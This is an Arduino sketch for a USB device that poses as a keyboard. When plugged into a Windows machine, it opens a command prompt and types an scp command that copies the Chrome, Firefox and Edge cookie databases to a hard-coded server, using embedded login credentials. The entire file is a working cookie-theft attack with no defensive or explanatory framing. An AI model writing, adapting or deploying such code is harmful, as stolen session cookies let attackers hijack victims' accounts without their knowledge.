#include <Keyboard.h>

// set variables for server connection
const char* server_user = "ubuntu";
const char* server_password = "ubuntu";
const char* server_path = "/home/ubuntu";
const char* server_ip = "192.168.8.124";
// choose desired browsers
bool chrome = 1;
bool firefox = 0;
bool edge = 1;

void setup() {
  //initialize keyboard
  Keyboard.begin();
  //enter folder with chrome cookies
  if (chrome == 1)
  {
    String path = "\"C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" ";
    copyCookies(path);
  };
  delay(2000);
  if (firefox == 1)
  {
    String path = "\"C:\\Users\%username%\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*-release\\cookies.sqlite\" ";
    copyCookies(path);
  };
  delay(2000);
  if (edge == 1)
  {
    String path = "\"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies\" ";
    copyCookies(path);
  };
  delay(2000);
  
  Keyboard.end();
}

void copyCookies(String path){
  //access CMD
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('c');
  delay(500);
  Keyboard.press('m');
  delay(500);
  Keyboard.press('d');
  delay(300);
  Keyboard.release('c');
  delay(300);
  Keyboard.release('m');
  delay(300);
  Keyboard.release('d');
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(500);
  //create command
  String copyCommand = "scp " + path + String(server_user) + "@" + String(server_ip) + ":" + String(server_path);
  Keyboard.println(copyCommand);
  delay(500);
  Keyboard.println(server_password);
  delay(3000);
  //end keystrokes
  Keyboard.println("exit");
  delay(1000);
}

void loop()
{
}